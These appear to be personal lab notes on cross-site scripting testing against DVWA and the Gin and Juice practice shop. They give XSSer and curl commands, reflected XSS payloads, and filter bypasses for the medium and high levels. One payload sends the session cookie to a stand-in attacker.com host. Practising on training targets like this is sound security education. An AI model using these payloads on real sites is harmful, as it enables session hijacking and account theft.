python3 xsser --url "https://ginandjuice.shop/catalog?id=XSS" --auto




===========================================================================
# DVWA 
===========================================================================



http://192.168.1.7/DVWA/vulnerabilities/xss_r/?name=vineeth&user_token=433a2145331472af1fdb657485f4ac3d#

python3 xsser -u "

PHPSESSID = Find Session id from the dev tool.
---------------------------------------------------------------------------------

Curl Test : 


curl -L -b "PHPSESSID=uddhe9e1sn4sen5aokhkp4pdit"  "http://192.168.1.7/DVWA/vulnerabilities/xss_r/?name=test123" -i

curl -L -b "PHPSESSID=uddhe9e1sn4sen5aokhkp4pdit; security=low" "http://192.168.1.7/DVWA/vulnerabilities/xss_r/?name=test123"
---------------------------------------------------------------------------------
XSSer :

 python3 xsser -u "http://192.168.1.7/DVWA/vulnerabilities/xss_r/?name=vineeth&user_token=433a2145331472af1fdb657485f4ac3d" --cookie='uddhe9e1sn4sen5aokhkp4pdit'


python3 xsser -u "http://192.168.1.7/DVWA/vulnerabilities/xss_r/?name=" --cookie="PHPSESSID=dsuef89qeumo7jhc3jq6gv8et7; security=low"



----------------------------------------------------------------------

What XSSer Found:
text

[FOUND !!!] -> [ b0ab792999d7afa3ca9f80662cb85f82 ] : [ name ] (executable: HTML injection (payload structure reflected unencoded))

The tool injected:
text

http://192.168.1.7/DVWA/vulnerabilities/xss_r/?name=%22%3Eb0ab792999d7afa3ca9f80662cb85f82

Which decodes to:
text

http://192.168.1.7/DVWA/vulnerabilities/xss_r/?name=">b0ab792999d7afa3ca9f80662cb85f82

The "> closed the HTML attribute and tag, allowing the hash to be rendered as HTML - this means the input is reflected unencoded!
Verify the Vulnerability Manually
1. Simple Alert Test:

Open in your browser:
text

http://192.168.1.7/DVWA/vulnerabilities/xss_r/?name=<script>alert(1)</script>

2. Test with your browser:
bash

# Open this in Firefox/Chrome
firefox "http://192.168.1.7/DVWA/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>"

3. Steal Cookies (Proof of Concept):
text

http://192.168.1.7/DVWA/vulnerabilities/xss_r/?name=<script>alert(document.cookie)</script>

4. More advanced payload:
text

http://192.168.1.7/DVWA/vulnerabilities/xss_r/?name=<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>

Test Different Payloads
Basic Payloads:
bash

# Simple alert
http://192.168.1.7/DVWA/vulnerabilities/xss_r/?name=<script>alert(1)</script>

# Alert with cookie
http://192.168.1.7/DVWA/vulnerabilities/xss_r/?name=<script>alert(document.cookie)</script>

# Image onerror
http://192.168.1.7/DVWA/vulnerabilities/xss_r/?name=<img src=x onerror=alert(1)>

# Body onload
http://192.168.1.7/DVWA/vulnerabilities/xss_r/?name=<body onload=alert(1)>

# SVG
http://192.168.1.7/DVWA/vulnerabilities/xss_r/?name=<svg/onload=alert(1)>

Encoded Payloads (to test filtering):
bash

# URL encoded
http://192.168.1.7/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C/script%3E

# Double encoded
http://192.168.1.7/DVWA/vulnerabilities/xss_r/?name=%253Cscript%253Ealert(1)%253C/script%253E

# Hex encoded
http://192.168.1.7/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C/script%3E

Test Different Security Levels
Medium Security:

Change cookie to security=medium:
bash

python3 xsser -u "http://192.168.1.7/DVWA/vulnerabilities/xss_r/?name=" \
  --cookie="PHPSESSID=dsuef89qeumo7jhc3jq6gv8et7; security=medium"

Try these bypasses for Medium:
bash

# Case insensitive
http://192.168.1.7/DVWA/vulnerabilities/xss_r/?name=<ScRiPt>alert(1)</ScRiPt>

# Event handlers (script tags filtered)
http://192.168.1.7/DVWA/vulnerabilities/xss_r/?name=<img src=x onerror=alert(1)>

# Double tag
http://192.168.1.7/DVWA/vulnerabilities/xss_r/?name=<scr<script>ipt>alert(1)</scr</script>ipt>

High Security:

Change cookie to security=high:
bash

python3 xsser -u "http://192.168.1.7/DVWA/vulnerabilities/xss_r/?name=" \
  --cookie="PHPSESSID=dsuef89qeumo7jhc3jq6gv8et7; security=high"

Try these bypasses for High:
bash

# Using img onerror (if script tags filtered)
http://192.168.1.7/DVWA/vulnerabilities/xss_r/?name=<img src=x onerror=alert(1)>

# Using iframe
http://192.168.1.7/DVWA/vulnerabilities/xss_r/?name=<iframe src="javascript:alert(1)">

# Using objects
http://192.168.1.7/DVWA/vulnerabilities/xss_r/?name=<object data="javascript:alert(1)">

Now Try XSSer with Advanced Options
1. Test all vectors:
bash

python3 xsser -u "http://192.168.1.7/DVWA/vulnerabilities/xss_r/?name=" \
  --cookie="PHPSESSID=dsuef89qeumo7jhc3jq6gv8et7; security=low" \
  --auto --all

2. Test with different techniques:
bash

python3 xsser -u "http://192.168.1.7/DVWA/vulnerabilities/xss_r/?name=" \
  --cookie="PHPSESSID=dsuef89qeumo7jhc3jq6gv8et7; security=low" \
  --Xsa --Xsr --Coo

3. Get detailed output:
bash

python3 xsser -u "http://192.168.1.7/DVWA/vulnerabilities/xss_r/?name=" \
  --cookie="PHPSESSID=dsuef89qeumo7jhc3jq6gv8et7; security=low" \
  --verbose --reverse-check

Test Other DVWA XSS Pages
1. Stored XSS:
bash

python3 xsser -u "http://192.168.1.7/DVWA/vulnerabilities/xss_s/" \
  --cookie="PHPSESSID=dsuef89qeumo7jhc3jq6gv8et7; security=low" \
  -p "txtName=XSS&mtxMessage=XSS&btnSign=Sign+Guestbook"

2. DOM XSS:
bash

python3 xsser -u "http://192.168.1.7/DVWA/vulnerabilities/xss_d/?default=English" \
  --cookie="PHPSESSID=dsuef89qeumo7jhc3jq6gv8et7; security=low"
  
  
  
  
  
  
  
  
  
===========================================================================
#   Gin and Juice shop..
============================================================================
  
https://ginandjuice.shop/catalog/product?productId=1

7tziejcDqfxOZJhFaigLY3MbwDAKfaM3


python3 xsser -u "https://ginandjuice.shop/catalog/product?productId=1" --cookie="session=7tziejcDqfxOZJhFaigLY3MbwDAKfaM3; security=low" 


curl -L -b "session=7tziejcDqfxOZJhFaigLY3MbwDAKfaM3"  "https://ginandjuice.shop/catalog/product?productId=1" -i
